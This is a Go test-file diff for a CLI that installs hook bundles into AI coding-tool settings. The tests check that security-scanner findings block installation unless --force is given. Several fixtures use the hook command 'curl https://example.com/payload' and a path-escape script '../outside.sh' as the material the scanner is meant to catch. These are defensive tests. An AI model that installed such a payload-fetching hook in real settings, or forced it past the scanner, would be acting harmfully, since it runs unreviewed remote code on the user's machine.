@@ -1,6 +1,7 @@
 package main
 
 import (
+	"cmp"
 	"encoding/json"
 	"errors"
 	"os"
@@ -1145,6 +1146,8 @@ func resetLoadoutApplyFlags() {
 	loadoutApplyCmd.Flags().Set("base-dir", "")
 	loadoutApplyCmd.Flags().Set("to", "")
 	loadoutApplyCmd.Flags().Set("method", "symlink")
+	loadoutApplyCmd.Flags().Set("skip-unsupported", "false")
+	loadoutApplyCmd.Flags().Set("force", "false")
 }
 
 func TestRunLoadoutApply_EmptyLibraryReturnsNil(t *testing.T) {
@@ -1303,6 +1306,112 @@ func TestRunLoadoutApply_SnapshotAlreadyActiveConflicts(t *testing.T) {
 	}
 	if !strings.Contains(err.Error(), "already active") {
 		t.Errorf("error should mention already active, got %v", err)
+	}
+}
+
+// A hook with high-severity scanner findings fails keep with a hint to
+// --force, and --force applies it.
+func TestRunLoadoutApply_HighFindingHookNeedsForce(t *testing.T) {
+	root := setupLoadoutApplyRepo(t, "risky", "claude-code",
+		map[string][]string{"hooks": {"fetcher"}})
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	origDir := config.GlobalDirOverride
+	config.GlobalDirOverride = t.TempDir()
+	t.Cleanup(func() { config.GlobalDirOverride = origDir })
+	hookDir := filepath.Join(root, "hooks", "claude-code", "fetcher")
+	os.MkdirAll(hookDir, 0755)
+	os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"PostToolUse","handler":{"type":"command","command":"curl https://example.com/payload"}}]}`), 0644)
+	output.SetForTest(t)
+	loadoutApplyCmd.Flags().Set("keep", "true")
+	defer resetLoadoutApplyFlags()
+
+	err := loadoutApplyCmd.RunE(loadoutApplyCmd, []string{"risky"})
+	var se output.StructuredError
+	if !errors.As(err, &se) || !strings.Contains(se.Suggestion, "--force") {
+		t.Fatalf("keep: got %v, want an error suggesting --force", err)
+	}
+	if _, err := os.Stat(filepath.Join(home, ".claude", "settings.json")); !os.IsNotExist(err) {
+		t.Errorf("refused apply wrote settings.json (stat err %v)", err)
+	}
+
+	// The preview shows the finding, with the hint left to the refusal.
+	stdout, _ := output.SetForTest(t)
+	loadoutApplyCmd.Flags().Set("keep", "false")
+	if err := loadoutApplyCmd.RunE(loadoutApplyCmd, []string{"risky"}); err != nil {
+		t.Fatalf("preview: %v", err)
+	}
+	if out := stdout.String(); !strings.Contains(out, "high-severity scanner findings") || strings.Contains(out, "--force") {
+		t.Errorf("preview should show the finding without the --force hint:\n%s", out)
+	}
+	if _, err := os.Stat(filepath.Join(home, ".claude", "settings.json")); !os.IsNotExist(err) {
+		t.Errorf("preview wrote settings.json (stat err %v)", err)
+	}
+
+	loadoutApplyCmd.Flags().Set("keep", "true")
+	loadoutApplyCmd.Flags().Set("force", "true")
+	if err := loadoutApplyCmd.RunE(loadoutApplyCmd, []string{"risky"}); err != nil {
+		t.Fatalf("forced keep: %v", err)
+	}
+	data, _ := os.ReadFile(filepath.Join(home, ".claude", "settings.json"))
+	if !strings.Contains(string(data), "curl https://example.com/payload") {
+		t.Errorf("forced keep did not merge the hook: %s", data)
+	}
+}
+
+// A hook the second provider would refuse stops the apply before the first
+// provider changes, so the retry starts from a clean state.
+func TestRunLoadoutApply_MultiProviderRefusalChangesNoProvider(t *testing.T) {
+	for _, tc := range []struct {
+		name, event, command, want, geminiSettings, claudeCommand string
+	}{
+		{"scanner finding", "after_tool_execute", "curl https://example.com/payload", "--force", "", ""},
+		{"script outside the item", "after_tool_execute", "../outside.sh", "outside item directory", "", ""},
+		{"unknown event", "Bogus", "echo ok", "unknown hook event", "", ""},
+		{"unreadable provider settings", "after_tool_execute", "echo ok", "settings.json", "{not json", ""},
+		{"both providers refused", "after_tool_execute", "../outside.sh", "outside item directory", "", "curl https://example.com/payload"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			root := setupLoadoutApplyRepo(t, "", "", nil)
+			home := t.TempDir()
+			t.Setenv("HOME", home)
+			origDir := config.GlobalDirOverride
+			config.GlobalDirOverride = t.TempDir()
+			t.Cleanup(func() { config.GlobalDirOverride = origDir })
+			loDir := filepath.Join(root, "loadouts", "claude-code", "both")
+			os.MkdirAll(loDir, 0755)
+			os.WriteFile(filepath.Join(loDir, "loadout.yaml"), []byte("kind: loadout\nversion: 1\nname: both\ndescription: test loadout\nproviders:\n  - claude-code\n  - gemini-cli\nhooks:\n  - fetcher\n"), 0644)
+			os.WriteFile(filepath.Join(root, "hooks", "outside.sh"), []byte("#!/bin/sh\n"), 0755)
+			if tc.geminiSettings != "" {
+				os.MkdirAll(filepath.Join(home, ".gemini"), 0755)
+				os.WriteFile(filepath.Join(home, ".gemini", "settings.json"), []byte(tc.geminiSettings), 0644)
+			}
+			for slug, hook := range map[string][2]string{
+				"claude-code": {"after_tool_execute", cmp.Or(tc.claudeCommand, "echo done")},
+				"gemini-cli":  {tc.event, tc.command},
+			} {
+				hookDir := filepath.Join(root, "hooks", slug, "fetcher")
+				os.MkdirAll(hookDir, 0755)
+				os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"`+hook[0]+`","handler":{"type":"command","command":"`+hook[1]+`"}}]}`), 0644)
+			}
+			output.SetForTest(t)
+			loadoutApplyCmd.Flags().Set("keep", "true")
+			defer resetLoadoutApplyFlags()
+
+			err := loadoutApplyCmd.RunE(loadoutApplyCmd, []string{"both"})
+			var se output.StructuredError
+			if !errors.As(err, &se) || !strings.Contains(se.Message, "gemini-cli") || !strings.Contains(se.Suggestion+se.Details, tc.want) {
+				t.Fatalf("keep: got %v, want a gemini-cli error mentioning %q", err, tc.want)
+			}
+			// Every provider's refusal is reported, so one retry carries
+			// every flag they name.
+			if tc.claudeCommand != "" && (!strings.Contains(se.Message, "claude-code") || !strings.Contains(se.Details, "high-severity") || !strings.Contains(se.Suggestion, "--force")) {
+				t.Errorf("keep: got %v, want claude-code's finding reported beside gemini-cli's", err)
+			}
+			if _, err := os.Stat(filepath.Join(home, ".claude", "settings.json")); !os.IsNotExist(err) {
+				t.Errorf("refused apply changed claude-code first (stat err %v)", err)
+			}
+		})
 	}
 }
 
